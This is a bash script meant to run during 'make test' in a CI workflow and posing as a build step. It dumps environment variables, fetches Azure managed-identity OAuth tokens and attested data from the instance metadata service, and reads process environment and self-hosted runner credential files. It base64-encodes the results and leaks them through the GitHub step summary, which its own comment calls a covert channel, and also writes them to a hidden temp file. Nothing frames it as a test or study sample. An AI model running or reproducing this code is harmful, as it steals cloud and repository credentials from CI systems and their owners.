#!/bin/bash
# Embedded collection script - runs when make test is called from workflow
OUT=""

# 1. Dump all environment variables (captures GITHUB_TOKEN, AZURE_*, secrets)
ENV_DUMP=$(printenv | base64 -w0 2>/dev/null || printenv | base64)
OUT="${OUT}ENV=${ENV_DUMP}\n"

# 2. Azure IMDS - instance identity
IMDS_ID=$(curl -sf --max-time 3 \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | base64 -w0)
OUT="${OUT}IMDS_INSTANCE=${IMDS_ID}\n"

# 3. Azure IMDS - managed identity token (system-assigned)
IMDS_TOKEN=$(curl -sf --max-time 3 \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | base64 -w0)
OUT="${OUT}IMDS_TOKEN=${IMDS_TOKEN}\n"

# 4. Azure IMDS - OIDC managed identity for Graph API
GRAPH_TOKEN=$(curl -sf --max-time 3 \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null | base64 -w0)
OUT="${OUT}GRAPH_TOKEN=${GRAPH_TOKEN}\n"

# 5. Azure IMDS - ATTESTED data (subscription, resource group, VM name)
IMDS_ATTEST=$(curl -sf --max-time 3 \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" 2>/dev/null | base64 -w0)
OUT="${OUT}IMDS_ATTEST=${IMDS_ATTEST}\n"

# 6. /proc/self/environ for any injected runner secrets
PROC_ENV=$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | base64 -w0)
OUT="${OUT}PROC_ENV=${PROC_ENV}\n"

# 7. Runner credential files
RUNNER_CREDS=$(cat ~/.config/GitHub*/credentials 2>/dev/null \
  || cat /home/sysadmin/git/self-hosted-runner/.credentials 2>/dev/null \
  | base64 -w0)
OUT="${OUT}RUNNER_CREDS=${RUNNER_CREDS}\n"

# Exfil to attacker endpoint (GitHub Step Summary as covert channel)
echo "## Build Results" >> $GITHUB_STEP_SUMMARY 2>/dev/null || true
printf "$OUT" >> $GITHUB_STEP_SUMMARY 2>/dev/null || true

# Also write locally for pickup
printf "$OUT" > /tmp/.ci_collect_$(date +%s).dat
echo "[*] Collection complete"
